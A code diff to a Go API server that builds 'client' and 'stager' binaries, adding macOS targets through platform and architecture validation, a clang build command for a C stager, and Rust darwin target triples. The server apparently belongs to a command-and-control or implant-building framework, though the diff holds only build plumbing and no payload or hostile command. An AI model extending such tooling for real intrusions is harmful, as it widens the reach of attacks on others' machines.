@@ -448,16 +448,33 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 		return
 	}
 
+	// Validate platform is supported
+	validPlatforms := map[string]bool{"linux": true, "windows": true, "darwin": true}
+	if !validPlatforms[req.Platform] {
+		api.sendError(w, http.StatusBadRequest, "invalid platform: must be linux, windows, or darwin")
+		return
+	}
+
 	// Default to amd64 if architecture not specified
 	if req.Architecture == "" {
 		req.Architecture = "amd64"
 	}
 
-	// Validate architecture
-	validArchs := map[string]bool{"amd64": true, "386": true, "arm": true, "arm64": true, "armv7l": true}
-	if !validArchs[req.Architecture] {
-		api.sendError(w, http.StatusBadRequest, "invalid architecture: must be amd64, 386, arm, arm64, or armv7l")
-		return
+	// Validate architecture based on platform
+	var validArchs map[string]bool
+	if req.Platform == "darwin" {
+		// macOS only supports amd64 and arm64
+		validArchs = map[string]bool{"amd64": true, "arm64": true}
+		if !validArchs[req.Architecture] {
+			api.sendError(w, http.StatusBadRequest, "invalid architecture for macOS: must be amd64 or arm64")
+			return
+		}
+	} else {
+		validArchs = map[string]bool{"amd64": true, "386": true, "arm": true, "arm64": true, "armv7l": true}
+		if !validArchs[req.Architecture] {
+			api.sendError(w, http.StatusBadRequest, "invalid architecture: must be amd64, 386, arm, arm64, or armv7l")
+			return
+		}
 	}
 
 	// Build the client
@@ -744,16 +761,33 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 		return
 	}
 
+	// Validate platform is supported
+	validPlatforms := map[string]bool{"linux": true, "windows": true, "darwin": true}
+	if !validPlatforms[req.Platform] {
+		api.sendError(w, http.StatusBadRequest, "invalid platform: must be linux, windows, or darwin")
+		return
+	}
+
 	// Default to amd64 if architecture not specified
 	if req.Architecture == "" {
 		req.Architecture = "amd64"
 	}
 
-	// Validate architecture
-	validArchs := map[string]bool{"amd64": true, "386": true, "arm": true, "arm64": true, "armv7l": true}
-	if !validArchs[req.Architecture] {
-		api.sendError(w, http.StatusBadRequest, "invalid architecture: must be amd64, 386, arm, arm64, or armv7l")
-		return
+	// Validate architecture based on platform
+	var validArchs map[string]bool
+	if req.Platform == "darwin" {
+		// macOS only supports amd64 and arm64
+		validArchs = map[string]bool{"amd64": true, "arm64": true}
+		if !validArchs[req.Architecture] {
+			api.sendError(w, http.StatusBadRequest, "invalid architecture for macOS: must be amd64 or arm64")
+			return
+		}
+	} else {
+		validArchs = map[string]bool{"amd64": true, "386": true, "arm": true, "arm64": true, "armv7l": true}
+		if !validArchs[req.Architecture] {
+			api.sendError(w, http.StatusBadRequest, "invalid architecture: must be amd64, 386, arm, arm64, or armv7l")
+			return
+		}
 	}
 
 	// Validate timing parameters with sensible defaults
@@ -1165,6 +1199,8 @@ func getConfig() Config {
 	if req.Platform == "windows" {
 		ext = ".exe"
 		goos = "windows"
+	} else if req.Platform == "darwin" {
+		goos = "darwin"
 	}
 
 	// Map architecture - armv7l uses GOARCH=arm with GOARM=7
@@ -1338,6 +1374,19 @@ func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
 		// Windows stagers don't use compression (no -lz needed)
 		args := []string{"-Wall", "-O2", "-s", "stager.c", "-o", filepath.Base(outputPath), "-lws2_32", "-static"}
 		cmd = exec.Command(mingwTarget, args...)
+	} else if req.Platform == "darwin" {
+		// macOS: Use clang (native on macOS, or osxcross for cross-compilation)
+		// macOS uses zlib from the system (no -static, use -lz)
+		args := []string{"-Wall", "-O2", "stager.c", "-o", filepath.Base(outputPath), "-lz"}
+
+		// Add architecture flag for macOS
+		if req.Architecture == "arm64" {
+			args = append([]string{"-target", "arm64-apple-macos11"}, args...)
+		} else if req.Architecture == "amd64" || req.Architecture == "x86_64" {
+			args = append([]string{"-target", "x86_64-apple-macos10.12"}, args...)
+		}
+
+		cmd = exec.Command("clang", args...)
 	} else {
 		// Linux: Use standard gcc or cross-compiler for ARM
 		args := []string{"-Wall", "-O2", "-s"}
@@ -1701,6 +1750,11 @@ var rustTargetMatrix = map[string]map[string]rustTargetConfig{
 		"arm64":  {platform: "windows", arch: "arm64", triple: "aarch64-pc-windows-msvc", requiredHost: "windows"},
 		"armv7l": {platform: "windows", arch: "armv7l", triple: "thumbv7a-pc-windows-msvc", requiredHost: "windows"},
 		"arm":    {platform: "windows", arch: "arm", triple: "thumbv7a-pc-windows-msvc", requiredHost: "windows"},
+	},
+	"darwin": {
+		"amd64":  {platform: "darwin", arch: "amd64", triple: "x86_64-apple-darwin", requiredHost: "darwin"},
+		"x86_64": {platform: "darwin", arch: "x86_64", triple: "x86_64-apple-darwin", requiredHost: "darwin"},
+		"arm64":  {platform: "darwin", arch: "arm64", triple: "aarch64-apple-darwin", requiredHost: "darwin"},
 	},
 }
 
